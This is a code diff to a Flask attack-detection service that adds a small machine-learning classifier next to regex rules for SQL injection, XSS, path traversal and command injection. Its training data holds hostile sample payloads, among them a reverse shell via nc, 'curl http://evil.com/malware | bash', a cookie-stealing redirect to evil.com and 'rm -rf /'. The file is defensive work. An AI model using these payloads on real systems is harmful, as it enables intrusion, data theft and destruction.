@@ -1,97 +1,232 @@
 """
 WEJÀ AI Engine - Hybrid Attack Detection Service
-Combines rule-based pattern matching with simulated ML confidence scoring.
+Combines rule-based pattern matching with ML-based confidence scoring.
 """
 
 import re
-import random
+import numpy as np
 from flask import Flask, request, jsonify
 from flask_cors import CORS
+
+# ML imports
+from sklearn.feature_extraction.text import TfidfVectorizer
+from sklearn.linear_model import LogisticRegression
+from sklearn.preprocessing import LabelEncoder
 
 app = Flask(__name__)
 CORS(app)
 
+# ============ ML MODEL TRAINING DATA ============
+# Sample training data for the ML model
+TRAINING_DATA = [
+    # SQL Injection samples
+    ("' OR 1=1 --", "SQL_INJECTION"),
+    ("'; DROP TABLE users; --", "SQL_INJECTION"),
+    ("1' AND '1'='1", "SQL_INJECTION"),
+    ("admin'--", "SQL_INJECTION"),
+    ("' UNION SELECT * FROM users --", "SQL_INJECTION"),
+    ("1; SELECT * FROM information_schema.tables", "SQL_INJECTION"),
+    ("' OR 'x'='x", "SQL_INJECTION"),
+    ("1' OR '1'='1' /*", "SQL_INJECTION"),
+    ("'; EXEC xp_cmdshell('dir'); --", "SQL_INJECTION"),
+    ("1 AND 1=1 UNION SELECT null, username, password FROM users", "SQL_INJECTION"),
+    
+    # XSS samples
+    ("<script>alert('XSS')</script>", "XSS"),
+    ("<img src=x onerror=alert(1)>", "XSS"),
+    ("javascript:alert(document.cookie)", "XSS"),
+    ("<svg onload=alert(1)>", "XSS"),
+    ("<body onload=alert('XSS')>", "XSS"),
+    ("<iframe src='javascript:alert(1)'>", "XSS"),
+    ("'\"><script>alert(String.fromCharCode(88,83,83))</script>", "XSS"),
+    ("<input onfocus=alert(1) autofocus>", "XSS"),
+    ("document.location='http://evil.com?c='+document.cookie", "XSS"),
+    ("<div style=\"background:url(javascript:alert('XSS'))\">", "XSS"),
+    
+    # Path Traversal samples
+    ("../../../etc/passwd", "PATH_TRAVERSAL"),
+    ("....//....//etc/passwd", "PATH_TRAVERSAL"),
+    ("%2e%2e%2f%2e%2e%2fetc/passwd", "PATH_TRAVERSAL"),
+    ("..\\..\\..\\windows\\system32\\config\\sam", "PATH_TRAVERSAL"),
+    ("/var/www/../../etc/shadow", "PATH_TRAVERSAL"),
+    ("file:///etc/passwd", "PATH_TRAVERSAL"),
+    ("....//....//....//etc/passwd", "PATH_TRAVERSAL"),
+    ("%252e%252e%252fetc/passwd", "PATH_TRAVERSAL"),
+    
+    # Command Injection samples
+    ("; ls -la", "COMMAND_INJECTION"),
+    ("| cat /etc/passwd", "COMMAND_INJECTION"),
+    ("`whoami`", "COMMAND_INJECTION"),
+    ("$(cat /etc/passwd)", "COMMAND_INJECTION"),
+    ("; rm -rf /", "COMMAND_INJECTION"),
+    ("&& wget http://evil.com/shell.sh", "COMMAND_INJECTION"),
+    ("| nc -e /bin/sh 10.0.0.1 4444", "COMMAND_INJECTION"),
+    ("; curl http://evil.com/malware | bash", "COMMAND_INJECTION"),
+    
+    # Safe/Normal samples
+    ("Hello World", "SAFE"),
+    ("Search for products", "SAFE"),
+    ("user@example.com", "SAFE"),
+    ("Contact us for more information", "SAFE"),
+    ("Add item to cart", "SAFE"),
+    ("View order history", "SAFE"),
+    ("Update profile settings", "SAFE"),
+    ("Download invoice PDF", "SAFE"),
+    ("GET /api/users/123", "SAFE"),
+    ("POST /api/orders", "SAFE"),
+    ("username=john&password=secret123", "SAFE"),
+    ("filter=price&sort=asc", "SAFE"),
+]
+
+# Initialize ML model
+print("[*] Training ML model...")
+texts = [t[0] for t in TRAINING_DATA]
+labels = [t[1] for t in TRAINING_DATA]
+
+# Feature extraction
+vectorizer = TfidfVectorizer(
+    analyzer='char',
+    ngram_range=(2, 5),
+    max_features=1000
+)
+X = vectorizer.fit_transform(texts)
+
+# Label encoding
+label_encoder = LabelEncoder()
+y = label_encoder.fit_transform(labels)
+
+# Train model
+ml_model = LogisticRegression(max_iter=1000)
+ml_model.fit(X, y)
+print("[OK] ML model trained successfully!")
+
+
+def predict_threat(request_text: str) -> tuple:
+    """
+    Use ML model to predict threat type and confidence.
+    Returns: (predicted_type, confidence_score)
+    """
+    if not request_text or len(request_text.strip()) == 0:
+        return "SAFE", 0.1
+    
+    try:
+        # Transform input text
+        X_new = vectorizer.transform([request_text])
+        
+        # Get prediction probabilities
+        probs = ml_model.predict_proba(X_new)[0]
+        predicted_class = np.argmax(probs)
+        confidence = float(probs[predicted_class])
+        
+        # Decode label
+        predicted_label = label_encoder.inverse_transform([predicted_class])[0]
+        
+        return predicted_label, confidence
+    except Exception as e:
+        app.logger.error(f"ML prediction error: {e}")
+        return "SAFE", 0.1
+
+
 # ============ RULE-BASED DETECTION PATTERNS ============
 
 SQLI_PATTERNS = [
-    r"(\%27)|(\')|(\-\-)|(\%23)|(#)",  # Basic SQL meta-characters
-    r"((\%3D)|(=))[^\n]*((\%27)|(\')|(\-\-)|(\%3B)|(;))",  # SQL injection attempts
-    r"\w*((\%27)|(\'))((\%6F)|o|(\%4F))((\%72)|r|(\%52))",  # OR based injection
-    r"((\%27)|(\'))union",  # UNION attacks
-    r"exec(\s|\+)+(s|x)p\w+",  # Stored procedure attacks
-    r"(select|insert|update|delete|drop|truncate|alter)\s",  # SQL keywords
-    r"(\%27)|(')\s*(or|and)\s*\d+\s*=\s*\d+",  # OR 1=1 patterns
-    r"1\s*=\s*1",  # Tautology
-    r"'\s*or\s*'",  # String OR injection
+    r"(\%27)|(\')|(\-\-)|(\%23)|(#)",
+    r"((\%3D)|(=))[^\n]*((\%27)|(\')|(\-\-)|(\%3B)|(;))",
+    r"\w*((\%27)|(\'))((\\%6F)|o|(\%4F))((\%72)|r|(\%52))",
+    r"((\%27)|(\'))union",
+    r"exec(\s|\+)+(s|x)p\w+",
+    r"(select|insert|update|delete|drop|truncate|alter)\s",
+    r"(\%27)|(\')\s*(or|and)\s*\d+\s*=\s*\d+",
+    r"1\s*=\s*1",
+    r"\'\s*or\s*\'",
 ]
 
 XSS_PATTERNS = [
-    r"<script[^>]*>.*?</script>",  # Script tags
-    r"javascript\s*:",  # JavaScript protocol
-    r"on\w+\s*=",  # Event handlers (onclick, onerror, etc.)
-    r"<\s*img[^>]+onerror",  # IMG tag with onerror
-    r"<\s*svg[^>]+onload",  # SVG with onload
-    r"<\s*iframe",  # Iframe injection
-    r"<\s*embed",  # Embed tag
-    r"<\s*object",  # Object tag
-    r"expression\s*\(",  # CSS expression
-    r"alert\s*\(",  # Alert function
-    r"document\.(cookie|location|write)",  # DOM manipulation
-    r"eval\s*\(",  # Eval function
+    r"<script[^>]*>.*?</script>",
+    r"javascript\s*:",
+    r"on\w+\s*=",
+    r"<\s*img[^>]+onerror",
+    r"<\s*svg[^>]+onload",
+    r"<\s*iframe",
+    r"<\s*embed",
+    r"<\s*object",
+    r"expression\s*\(",
+    r"alert\s*\(",
+    r"document\.(cookie|location|write)",
+    r"eval\s*\(",
 ]
 
 PATH_TRAVERSAL_PATTERNS = [
-    r"\.\./",  # Basic path traversal
-    r"\.\.\\",  # Windows path traversal
-    r"%2e%2e%2f",  # URL encoded ../
-    r"%252e%252e%252f",  # Double URL encoded
-    r"etc/passwd",  # Linux password file
-    r"etc/shadow",  # Linux shadow file
-    r"windows/system32",  # Windows system directory
+    r"\.\./",
+    r"\.\.\\",
+    r"%2e%2e%2f",
+    r"%252e%252e%252f",
+    r"etc/passwd",
+    r"etc/shadow",
+    r"windows/system32",
 ]
 
 COMMAND_INJECTION_PATTERNS = [
-    r";\s*(ls|cat|whoami|id|pwd|uname)",  # Unix commands
-    r"\|\s*(ls|cat|whoami|id|pwd|uname)",  # Pipe injection
-    r"`[^`]+`",  # Backtick command execution
-    r"\$\([^)]+\)",  # Command substitution
-    r"&&\s*(ls|cat|whoami|id|pwd|uname)",  # Command chaining
+    r";\s*(ls|cat|whoami|id|pwd|uname)",
+    r"\|\s*(ls|cat|whoami|id|pwd|uname)",
+    r"`[^`]+`",
+    r"\$\([^)]+\)",
+    r"&&\s*(ls|cat|whoami|id|pwd|uname)",
 ]
 
 
-def detect_attack_type(payload: str) -> tuple[bool, str, float]:
+def rule_based_detect(payload: str) -> tuple:
     """
-    Analyze payload for potential attacks.
+    Rule-based pattern matching detection.
     Returns: (is_malicious, attack_type, confidence)
     """
     payload_lower = payload.lower()
     
-    # Check SQL Injection
     for pattern in SQLI_PATTERNS:
         if re.search(pattern, payload_lower, re.IGNORECASE):
-            confidence = 0.85 + random.uniform(0, 0.14)  # 85-99% confidence
-            return True, "SQL_INJECTION", round(confidence, 2)
+            return True, "SQL_INJECTION", 0.90
     
-    # Check XSS
     for pattern in XSS_PATTERNS:
         if re.search(pattern, payload_lower, re.IGNORECASE):
-            confidence = 0.82 + random.uniform(0, 0.17)  # 82-99% confidence
-            return True, "XSS", round(confidence, 2)
+            return True, "XSS", 0.88
     
-    # Check Path Traversal
     for pattern in PATH_TRAVERSAL_PATTERNS:
         if re.search(pattern, payload_lower, re.IGNORECASE):
-            confidence = 0.88 + random.uniform(0, 0.11)  # 88-99% confidence
-            return True, "PATH_TRAVERSAL", round(confidence, 2)
+            return True, "PATH_TRAVERSAL", 0.92
     
-    # Check Command Injection
     for pattern in COMMAND_INJECTION_PATTERNS:
         if re.search(pattern, payload_lower, re.IGNORECASE):
-            confidence = 0.90 + random.uniform(0, 0.09)  # 90-99% confidence
-            return True, "COMMAND_INJECTION", round(confidence, 2)
+            return True, "COMMAND_INJECTION", 0.94
     
-    # No attack detected
-    return False, "SAFE", round(random.uniform(0.01, 0.15), 2)
+    return False, "SAFE", 0.1
+
+
+def detect_attack_type(payload: str) -> tuple:
+    """
+    Hybrid detection combining rule-based and ML approaches.
+    Returns: (is_malicious, attack_type, confidence)
+    """
+    # Get rule-based result
+    rule_detected, rule_type, rule_conf = rule_based_detect(payload)
+    
+    # Get ML result
+    ml_type, ml_conf = predict_threat(payload)
+    
+    # Combine results with weighted scoring
+    if rule_detected:
+        # Boost confidence if both methods agree
+        if rule_type == ml_type:
+            combined_conf = min(0.99, (rule_conf * 0.6 + ml_conf * 0.4) + 0.05)
+        else:
+            combined_conf = rule_conf
+        return True, rule_type, round(combined_conf, 2)
+    
+    # If rule-based didn't detect but ML has high confidence
+    if ml_type != "SAFE" and ml_conf > 0.7:
+        return True, ml_type, round(ml_conf * 0.85, 2)
+    
+    # No threat detected
+    return False, "SAFE", round(max(1 - ml_conf, 0.05), 2)
 
 
 @app.route('/health', methods=['GET'])
@@ -100,7 +235,9 @@ def health_check():
     return jsonify({
         "status": "healthy",
         "service": "WEJÀ AI Engine",
-        "version": "1.0.0"
+        "version": "1.1.0",
+        "ml_model": "LogisticRegression",
+        "detection": "Hybrid (Rule-based + ML)"
     })
 
 
@@ -112,7 +249,7 @@ def analyze_request():
     Expected JSON body:
     {
         "payload": "string to analyze",
-        "headers": {},  // optional
+        "headers": {},
         "method": "GET|POST|...",
         "path": "/target/path"
     }
@@ -128,16 +265,17 @@ def analyze_request():
                 "type": "UNKNOWN"
             }), 400
         
-        # Extract payload to analyze
         payload = data.get('payload', '')
         path = data.get('path', '')
         method = data.get('method', 'GET')
         
-        # Combine all inputs for analysis
         combined_payload = f"{payload} {path}"
         
         # Perform hybrid detection
         is_blocked, attack_type, confidence = detect_attack_type(combined_payload)
+        
+        # Get ML prediction for additional info
+        ml_type, ml_conf = predict_threat(combined_payload)
         
         response = {
             "blocked": is_blocked,
@@ -145,7 +283,9 @@ def analyze_request():
             "type": attack_type,
             "analyzed_method": method,
             "analyzed_path": path,
-            "payload_length": len(payload)
+            "payload_length": len(payload),
+            "ml_prediction": ml_type,
+            "ml_confidence": round(ml_conf, 2)
         }
         
         if is_blocked:
@@ -166,6 +306,7 @@ def analyze_request():
 
 
 if __name__ == '__main__':
-    print("🛡️  WEJÀ AI Engine starting...")
-    print("📡 Listening on http://localhost:5000")
+    print("[WEJA] AI Engine starting...")
+    print("[*] Listening on http://localhost:5000")
+    print("[*] Using hybrid detection: Rule-based + ML (LogisticRegression)")
     app.run(host='0.0.0.0', port=5000, debug=True)
